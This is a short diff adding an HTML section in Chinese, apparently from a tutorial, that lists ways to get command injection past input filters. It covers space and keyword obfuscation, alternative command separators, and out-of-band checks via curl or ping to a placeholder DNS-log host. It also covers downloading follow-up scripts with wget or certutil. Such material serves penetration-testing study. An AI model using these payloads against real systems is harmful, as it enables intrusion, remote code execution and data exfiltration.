@@ -1,0 +1,8 @@
+<h4>绕过技巧</h4>
+<ul>
+<li><b>空格被过滤</b>：Linux 用 <code>$&#123;IFS&#125;</code>、<code>%09</code>、<code>&lt;</code>、<code>&#123;cat,secret&#125;</code>；Windows 用 <code>%09</code>、<code>^</code> 转义。</li>
+<li><b>关键字被过滤</b>：<code>c'a't</code>、<code>c\\at</code>、变量拼接 <code>a=c;b=at;$a$b</code>、base64 解码后执行。</li>
+<li><b>拼接符被过滤</b>：换 <code>%0a</code> 换行、<code>;</code>、<code>$()</code>、反引号；Windows 试 <code>&amp;</code>、<code>|</code>、<code>||</code>、<code>&amp;&amp;</code>。</li>
+<li><b>无回显</b>：<code>ping -n 1 你的DNS域名</code>、<code>curl http://dnslog地址</code> 做带外验证；或先把结果写进文件再访问。</li>
+<li><b>长度/字符限制</b>：用短命令 <code>id</code>、<code>whoami</code>，分段写入文件，或用 <code>wget</code>/<code>certutil</code> 下载后续脚本。</li>
+</ul>
